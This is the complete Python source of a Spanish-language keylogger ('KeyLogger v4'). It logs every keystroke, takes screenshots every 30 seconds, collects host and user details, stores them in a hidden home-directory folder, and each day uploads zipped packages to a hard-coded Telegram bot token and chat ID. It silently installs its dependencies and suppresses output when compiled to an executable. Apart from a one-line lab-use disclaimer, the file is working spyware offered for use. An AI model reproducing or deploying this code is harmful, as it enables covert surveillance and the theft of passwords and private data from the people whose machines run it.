"""
KeyLogger v4 - Telegram + Optimizado (ImageGrab edition)
- Organización por día: NombreEquipo_YYYY-MM-DD
- Envío diario por Telegram del paquete del día anterior
- Limpieza automática de paquetes > 7 días
- Screenshots reducidos, JPG comprimido y detección de cambios
- Optimización de RAM y CPU
- Usa PIL.ImageGrab (estable al compilar con PyInstaller)

ADVERTENCIA LEGAL: Uso exclusivo en laboratorio/pentesting autorizado.
"""

import gc
import os
import sys
import time
import zipfile
import platform
import socket
import threading
import shutil
import urllib.request
import json
from datetime import datetime
from subprocess import call


# =========================================================
# 1. INSTALACIÓN AUTOMÁTICA DE DEPENDENCIAS
# =========================================================
def instalar_dependencias():
    try:
        from pynput import keyboard  # noqa
        from PIL import Image, ImageChops, ImageGrab  # noqa
    except ModuleNotFoundError:
        print("[!] Instalando dependencias...")
        call(f"{sys.executable} -m pip install pynput Pillow", shell=True)


instalar_dependencias()

from pynput import keyboard  # noqa
from pynput.keyboard import Listener, Key  # noqa
from PIL import Image, ImageChops, ImageGrab  # noqa


# =========================================================
# 2. CONFIGURACIÓN
# =========================================================
# --- Capturas ---
SCREENSHOT_EVERY    = 30       # segundos entre capturas
ESCALA_SCREENSHOT   = 0.6      # 60% del tamaño original
JPG_CALIDAD         = 75       # calidad JPG (1-100)
UMBRAL_CAMBIO       = 0.02     # 2% de píxeles diferentes = hubo cambio
COMPARAR_A_ESCALA   = 0.25     # comparar cambios a 25% para ahorrar CPU

# --- Teclas ---
MAX_KEYS_PER_FILE   = 5000     # rotación del archivo de teclas
PAUSA_MINUTOS       = 2        # minutos de inactividad para marcar pausa

# --- Organización ---
DIAS_RETENCION      = 7        # borra paquetes con más de N días
AUTO_LIMPIAR_DIAS   = True     # borra carpeta tras comprimir
MODO_EXE            = True     # True si corre como .exe (oculta prints)

# --- Telegram ---
ENVIAR_TELEGRAM     = True     # activar envío por Telegram
TELEGRAM_BOT_TOKEN  = "8843655050:AAFHFMzB5GVBFO7twixUZq2NOATb1XL27lo"
TELEGRAM_CHAT_ID    = "8069565514"
TELEGRAM_MAX_MB     = 45       # límite de subida por archivo (bot API: 50 MB)

# --- Carpetas ---
BASE_DIR = os.path.join(os.path.expanduser("~"), ".klab")
os.makedirs(BASE_DIR, exist_ok=True)


# =========================================================
# 3. UTILIDADES
# =========================================================
def log(msg):
    if not MODO_EXE:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def hoy_str():
    return datetime.now().strftime("%Y-%m-%d")


def ts_str():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def nombre_equipo():
    raw = socket.gethostname() or "Equipo"
    return "".join(c if c.isalnum() or c in "-_" else "_" for c in raw)[:40]


def carpeta_dia(dia):
    return f"{nombre_equipo()}_{dia}"


def info_equipo():
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "N/A"
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USER") or os.environ.get("USERNAME") or "N/A"
    return (
        f"=== INFO EQUIPO ===\n"
        f"Hostname    : {socket.gethostname()}\n"
        f"IP local    : {ip}\n"
        f"Usuario     : {user}\n"
        f"SO          : {platform.system()} {platform.release()}\n"
        f"Arquitectura: {platform.machine()}\n"
        f"Procesador  : {platform.processor()}\n"
        f"Python      : {platform.python_version()}\n"
        f"Fecha       : {datetime.now().isoformat()}\n"
    )


# =========================================================
# 4. CLIENTE TELEGRAM (sin librerías extra)
# =========================================================
class Telegram:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.activo = bool(
            token and chat_id
            and token != "TU_BOT_TOKEN_AQUI"
            and chat_id != "TU_CHAT_ID_AQUI"
        )

    def _post(self, metodo, data):
        url = f"https://api.telegram.org/bot{self.token}/{metodo}"
        try:
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode(),
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=60) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            log(f"Telegram error ({metodo}): {e}")
            return None

    def enviar_mensaje(self, texto):
        if not self.activo:
            return False
        res = self._post("sendMessage", {
            "chat_id": self.chat_id,
            "text": texto[:4000],
            "parse_mode": "HTML",
        })
        return bool(res and res.get("ok"))

    def enviar_archivo(self, ruta, caption=""):
        if not self.activo:
            return False
        if not os.path.exists(ruta):
            return False

        tamano_mb = os.path.getsize(ruta) / (1024 * 1024)
        if tamano_mb > TELEGRAM_MAX_MB:
            log(f"Archivo {tamano_mb:.1f} MB excede el límite, no se envía")
            self.enviar_mensaje(
                f"⚠️ Paquete {os.path.basename(ruta)} "
                f"({tamano_mb:.1f} MB) excede el límite de Telegram."
            )
            return False

        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        boundary = "----klabboundary" + ts_str()

        try:
            with open(ruta, "rb") as f:
                contenido = f.read()

            cuerpo = b""
            cuerpo += f"--{boundary}\r\n".encode()
            cuerpo += b'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            cuerpo += f"{self.chat_id}\r\n".encode()

            if caption:
                cuerpo += f"--{boundary}\r\n".encode()
                cuerpo += b'Content-Disposition: form-data; name="caption"\r\n\r\n'
                cuerpo += f"{caption[:900]}\r\n".encode()

            cuerpo += f"--{boundary}\r\n".encode()
            cuerpo += (
                f'Content-Disposition: form-data; name="document"; '
                f'filename="{os.path.basename(ruta)}"\r\n'
            ).encode()
            cuerpo += b"Content-Type: application/zip\r\n\r\n"
            cuerpo += contenido + b"\r\n"
            cuerpo += f"--{boundary}--\r\n".encode()

            req = urllib.request.Request(
                url,
                data=cuerpo,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                },
            )
            with urllib.request.urlopen(req, timeout=180) as r:
                res = json.loads(r.read().decode())

            ok = bool(res and res.get("ok"))
            if ok:
                log(f"Telegram: enviado {os.path.basename(ruta)} ({tamano_mb:.1f} MB)")
            else:
                log(f"Telegram: respuesta inesperada: {res}")
            return ok
        except Exception as e:
            log(f"Telegram upload error: {e}")
            return False


# =========================================================
# 5. GESTOR DE DÍAS
# =========================================================
class GestorDias:
    def __init__(self, base_dir, telegram):
        self.base_dir = base_dir
        self.telegram = telegram
        self.dia_actual = hoy_str()
        self.dir_dia = self._preparar_dia(self.dia_actual)
        self.dir_keys = os.path.join(self.dir_dia, "keys")
        self.dir_shots = os.path.join(self.dir_dia, "screenshots")
        os.makedirs(self.dir_keys, exist_ok=True)
        os.makedirs(self.dir_shots, exist_ok=True)

    def _preparar_dia(self, dia):
        d = os.path.join(self.base_dir, carpeta_dia(dia))
        os.makedirs(d, exist_ok=True)
        return d

    def _renombrar_si_cambio_hostname(self):
        actual_esperado = os.path.join(self.base_dir, carpeta_dia(self.dia_actual))
        if self.dir_dia != actual_esperado and os.path.isdir(self.dir_dia):
            try:
                os.rename(self.dir_dia, actual_esperado)
                self.dir_dia = actual_esperado
                self.dir_keys = os.path.join(self.dir_dia, "keys")
                self.dir_shots = os.path.join(self.dir_dia, "screenshots")
                log(f"Carpeta renombrada: {actual_esperado}")
            except Exception as e:
                log(f"No se pudo renombrar: {e}")

    def comprimir_dia(self, dia):
        carpeta = os.path.join(self.base_dir, carpeta_dia(dia))
        if not os.path.isdir(carpeta):
            return None
        zip_path = os.path.join(self.base_dir, f"{carpeta_dia(dia)}.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(carpeta):
                    for f in files:
                        full = os.path.join(root, f)
                        rel = os.path.relpath(full, carpeta)
                        zf.write(full, arcname=rel)
            log(f"Día comprimido: {zip_path}")
            if AUTO_LIMPIAR_DIAS:
                shutil.rmtree(carpeta, ignore_errors=True)
                log(f"Carpeta original borrada: {carpeta}")
            return zip_path
        except Exception as e:
            log(f"Error comprimiendo {dia}: {e}")
            return None

    def enviar_zip(self, zip_path, dia):
        if not zip_path or not self.telegram.activo:
            return False
        tamano = os.path.getsize(zip_path) / (1024 * 1024)
        caption = (
            f"📦 Paquete {dia}\n"
            f"Equipo: {socket.gethostname()}\n"
            f"Tamaño: {tamano:.1f} MB"
        )
        return self.telegram.enviar_archivo(zip_path, caption)

    def limpiar_antiguos(self):
        ahora = time.time()
        limite = DIAS_RETENCION * 86400
        eliminados = 0
        for item in os.listdir(self.base_dir):
            if item == "info.txt":
                continue
            ruta = os.path.join(self.base_dir, item)
            try:
                edad = ahora - os.path.getmtime(ruta)
                if edad > limite:
                    if os.path.isfile(ruta) and item.endswith(".zip"):
                        os.remove(ruta)
                        eliminados += 1
                    elif os.path.isdir(ruta):
                        shutil.rmtree(ruta, ignore_errors=True)
                        eliminados += 1
            except Exception as e:
                log(f"Error limpiando {item}: {e}")
        if eliminados:
            log(f"Limpieza: {eliminados} elemento(s) antiguo(s) borrado(s)")

    def comprimir_y_enviar_pendientes(self):
        hoy = self.dia_actual
        for item in os.listdir(self.base_dir):
            full = os.path.join(self.base_dir, item)
            if not os.path.isdir(full):
                continue
            partes = item.rsplit("_", 1)
            if len(partes) != 2:
                continue
            try:
                datetime.strptime(partes[1], "%Y-%m-%d")
            except ValueError:
                continue
            if partes[1] == hoy:
                continue

            zip_path = os.path.join(self.base_dir, f"{item}.zip")
            if not os.path.exists(zip_path):
                zip_path = self.comprimir_dia(partes[1])
                if zip_path:
                    self.enviar_zip(zip_path, partes[1])
            else:
                self.enviar_zip(zip_path, partes[1])
                if AUTO_LIMPIAR_DIAS and os.path.isdir(full):
                    shutil.rmtree(full, ignore_errors=True)

    def verificar_cambio_dia(self):
        self._renombrar_si_cambio_hostname()
        hoy = hoy_str()
        if hoy != self.dia_actual:
            log(f"Cambio de día: {self.dia_actual} → {hoy}")
            dia_ayer = self.dia_actual
            zip_path = self.comprimir_dia(dia_ayer)
            if zip_path:
                threading.Thread(
                    target=self.enviar_zip,
                    args=(zip_path, dia_ayer),
                    daemon=True,
                ).start()
            self.dia_actual = hoy
            self.dir_dia = self._preparar_dia(hoy)
            self.dir_keys = os.path.join(self.dir_dia, "keys")
            self.dir_shots = os.path.join(self.dir_dia, "screenshots")
            os.makedirs(self.dir_keys, exist_ok=True)
            os.makedirs(self.dir_shots, exist_ok=True)
            self.limpiar_antiguos()
            gc.collect()
            return True
        return False


# =========================================================
# 6. KEYLOGGER PRINCIPAL
# =========================================================
class KeyLogger:
    def __init__(self):
        self.telegram = Telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
        self.gestor = GestorDias(BASE_DIR, self.telegram)
        self.lock = threading.Lock()

        self.session_start = datetime.now()
        self.ultima_tecla = datetime.now()
        self.pausa_marcada = False
        self.teclas_en_archivo = 0
        self.current_keys_file = self._nuevo_keys_file()
        self._escribir_encabezado()

        self.total_shots = 0
        self.total_keys = 0
        self.shots_omitidos = 0

        self._ultima_mini = None

        self._key_buffer = []
        self._buffer_max = 50

    def _nuevo_keys_file(self):
        return os.path.join(self.gestor.dir_keys, f"keys_{ts_str()}.txt")

    def _escribir_encabezado(self):
        try:
            try:
                user = os.getlogin()
            except Exception:
                user = os.environ.get("USER") or os.environ.get("USERNAME") or "N/A"
            header = (
                "=" * 64 + "\n"
                f"SESIÓN INICIADA: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Equipo         : {socket.gethostname()}\n"
                f"Usuario        : {user}\n"
                + "=" * 64 + "\n\n"
            )
            with open(self.current_keys_file, "a", encoding="utf-8") as f:
                f.write(header)
        except Exception as e:
            log(f"Error encabezado: {e}")

    def _rotar_archivo_si_necesario(self):
        if self.teclas_en_archivo >= MAX_KEYS_PER_FILE:
            self.current_keys_file = self._nuevo_keys_file()
            self.session_start = datetime.now()
            self.teclas_en_archivo = 0
            self._escribir_encabezado()
            log("Archivo de teclas rotado")

    def _flush_buffer(self):
        if not self._key_buffer:
            return
        try:
            with self.lock:
                self._rotar_archivo_si_necesario()
                with open(self.current_keys_file, "a", encoding="utf-8") as f:
                    f.write("".join(self._key_buffer))
                self._key_buffer.clear()
        except Exception as e:
            log(f"Error flush: {e}")

    def _escribir(self, texto):
        self._key_buffer.append(texto)
        self.teclas_en_archivo += 1
        self.total_keys += 1
        if len(self._key_buffer) >= self._buffer_max:
            self._flush_buffer()

    def _formatear_tecla(self, key):
        mapa = {
            Key.space: " ",
            Key.enter: "<ENTER>\n",
            Key.tab: "<TAB>",
            Key.backspace: "<BACKSPACE>",
            Key.delete: "<DELETE>",
            Key.esc: "<ESC>",
            Key.up: "<UP>",
            Key.down: "<DOWN>",
            Key.left: "<LEFT>",
            Key.right: "<RIGHT>",
            Key.home: "<HOME>",
            Key.end: "<END>",
            Key.page_up: "<PGUP>",
            Key.page_down: "<PGDN>",
            Key.insert: "<INSERT>",
            Key.print_screen: "<PRTSC>",
            Key.scroll_lock: "<SCRLK>",
            Key.pause: "<PAUSE>",
            Key.num_lock: "<NUMLK>",
            Key.caps_lock: "<CAPSLOCK>",
            Key.ctrl: "<CTRL>", Key.ctrl_l: "<CTRL>", Key.ctrl_r: "<CTRL>",
            Key.alt: "<ALT>", Key.alt_l: "<ALT>", Key.alt_r: "<ALT>",
            Key.alt_gr: "<ALT>",
            Key.cmd: "<WIN>",
        }
        if key in mapa:
            return mapa[key]
        for i in range(1, 13):
            if key == getattr(Key, f"f{i}"):
                return f"<F{i}>"
        if key in (Key.shift, Key.shift_l, Key.shift_r):
            return None
        try:
            return key.char
        except AttributeError:
            return f"<{str(key).replace('Key.', '').upper()}>"

    def on_press(self, key):
        try:
            ahora = datetime.now()
            delta = (ahora - self.ultima_tecla).total_seconds()
            if delta >= PAUSA_MINUTOS * 60 and not self.pausa_marcada:
                self._escribir(f"\n\n--- PAUSA DE {int(delta // 60)} MIN ---\n\n")
                self.pausa_marcada = True

            texto = self._formatear_tecla(key)
            if texto is not None:
                if self.pausa_marcada or self.teclas_en_archivo == 0:
                    self._escribir(f"[{ahora.strftime('%H:%M:%S')}] {texto}")
                    self.pausa_marcada = False
                else:
                    self._escribir(texto)
            self.ultima_tecla = ahora
        except Exception:
            pass

    def on_release(self, key):
        if key in (Key.shift, Key.shift_l, Key.shift_r):
            self._escribir("<SHIFT>")

    def _hubo_cambio(self, img):
        try:
            ancho, alto = img.size
            mini = img.convert("L").resize(
                (max(1, int(ancho * COMPARAR_A_ESCALA)),
                 max(1, int(alto * COMPARAR_A_ESCALA))),
                Image.BILINEAR,
            )
            if self._ultima_mini is None:
                self._ultima_mini = mini
                return True

            diff = ImageChops.difference(mini, self._ultima_mini)
            hist = diff.histogram()
            total = sum(hist)
            if total == 0:
                return False
            cambiados = sum(hist[25:])
            ratio = cambiados / total if total else 0
            self._ultima_mini = mini
            return ratio > UMBRAL_CAMBIO
        except Exception as e:
            log(f"Error comparando: {e}")
            return True

    def screenshot_worker(self):
        while True:
            try:
                self.gestor.verificar_cambio_dia()

                # >>> Cambio clave: ImageGrab en vez de pyscreenshot <<<
                img = ImageGrab.grab()

                if not self._hubo_cambio(img):
                    self.shots_omitidos += 1
                else:
                    ancho, alto = img.size
                    img_red = img.resize(
                        (int(ancho * ESCALA_SCREENSHOT),
                         int(alto * ESCALA_SCREENSHOT)),
                        Image.BILINEAR,
                    )
                    fname = os.path.join(
                        self.gestor.dir_shots, f"shot_{ts_str()}.jpg"
                    )
                    img_red.save(fname, "JPEG",
                                 quality=JPG_CALIDAD, optimize=True)
                    self.total_shots += 1
                    img_red.close()

                img.close()
                del img

                if (self.total_shots + self.shots_omitidos) % 40 == 0:
                    log(f"Shots guardados: {self.total_shots} | "
                        f"Omitidos: {self.shots_omitidos} | "
                        f"Teclas: {self.total_keys}")

                if (self.total_shots + self.shots_omitidos) % 100 == 0:
                    gc.collect()

            except Exception as e:
                log(f"Error screenshot: {e}")
            time.sleep(SCREENSHOT_EVERY)

    def mantenimiento_worker(self):
        try:
            self.gestor.comprimir_y_enviar_pendientes()
        except Exception as e:
            log(f"Error en pasada inicial: {e}")

        contador = 0
        while True:
            time.sleep(60)
            contador += 1
            try:
                self.gestor.verificar_cambio_dia()
                self._flush_buffer()

                if contador % 60 == 0:
                    self.gestor.limpiar_antiguos()
                    gc.collect()
            except Exception as e:
                log(f"Error mantenimiento: {e}")

    def start(self):
        log("=" * 55)
        log("KeyLogger v4 iniciado (ImageGrab)")
        log(f"Directorio : {BASE_DIR}")
        log(f"Día actual : {self.gestor.dia_actual}")
        log(f"Carpeta    : {os.path.basename(self.gestor.dir_dia)}")
        log(f"Shot cada  : {SCREENSHOT_EVERY}s | Escala: {ESCALA_SCREENSHOT}")
        log(f"Telegram   : {'ON' if self.telegram.activo else 'OFF'}")
        log(f"Retención  : {DIAS_RETENCION} días")
        log("=" * 55)

        with open(os.path.join(BASE_DIR, "info.txt"), "w", encoding="utf-8") as f:
            f.write(info_equipo())

        threading.Thread(target=self.screenshot_worker, daemon=True).start()
        threading.Thread(target=self.mantenimiento_worker, daemon=True).start()

        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


# =========================================================
# 7. MAIN
# =========================================================
if __name__ == "__main__":
    try:
        kl = KeyLogger()
        kl.start()
    except KeyboardInterrupt:
        log("Detenido por el usuario.")
        try:
            kl._flush_buffer()
            kl.gestor.comprimir_dia(kl.gestor.dia_actual)
        except Exception:
            pass
    except Exception as e:
        log(f"Error fatal: {e}")